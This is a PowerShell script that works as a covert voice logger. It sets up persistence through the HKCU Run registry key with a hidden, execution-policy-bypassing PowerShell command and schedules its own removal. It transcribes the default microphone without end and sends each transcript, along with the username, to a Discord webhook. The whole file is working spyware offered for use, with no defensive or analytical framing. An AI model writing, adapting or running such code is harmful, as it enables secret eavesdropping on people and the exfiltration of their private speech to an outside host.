function Add-LoggerPersistency {
    [CmdletBinding()]
	param (
		[parameter(Position=0,Mandatory=$True)]
		[string]$name,
        [parameter(Mandatory=$True)]
		[string]$Command,
        [parameter(Mandatory=$False)]
		[string]$Days = 0 
	);

    if($Days -eq -1 -or $Days -gt 0){
        if(Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\$name"){ return };
    
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $name -Value $Command;
    
        if($Days -eq -1){ return };
        if(Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name"){ return };
    
        $date = (Get-Date).AddDays($Days);
        New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Force;
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Name "date" -Value $date;
    }
    
    if($Days -gt 0){
        $date = Get-Date;
        $targetValue = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Name "date";
        $targetDate = [DateTime]$targetValue.date;
    
        if($date -lt $targetDate){ return }
    
        Remove-Item "$env:temp\$name.ps1" -Force;
        Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Force
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $name -Force
    }
}

function Send-Discord {
	[CmdletBinding()]
	param (
		[parameter(Position=0,Mandatory=$False)]
		[string]$text 
	);

    # $Hook = "";

	$Body = @{
	  "username" = $env:username;
	  "content" = $text
	};

	if (-not ([string]::IsNullOrEmpty($text))){Invoke-RestMethod -ContentType "Application/Json" -Uri $Hook  -Method Post -Body ($Body | ConvertTo-Json) };
}

function Start-logger{
    Add-Type -AssemblyName System.Speech;
    $recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine;
    $grammar = New-Object System.Speech.Recognition.DictationGrammar;
    $recognizer.LoadGrammar($grammar);
    $recognizer.SetInputToDefaultAudioDevice();

    while ($true) {
        $result = $recognizer.Recognize();
        if ($result) {
            $results = $result.Text;
            $log = ("$env:tmp\voicelog.txt");
    
            Write-Output $results > $log;
    
            $text = Get-Content -Path $log -Raw;
            
            Send-Discord $text;
    
            switch -regex ($results) {
                "\bnote\b" {Start-Process notepad};
                "\bexit\b" {break};
            };
        };
    };
    
    Clear-Content -Path $log;
}

$name = "voicelog"
$autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun + '$Persistent=' + $Persistent + ';Get-Item ' + $name +'.ps1 | Invoke-Expression;sleep 5;exit'); 
Add-LoggerPersistency $name -Command $autostart -Days $DaysRun;
Start-Logger

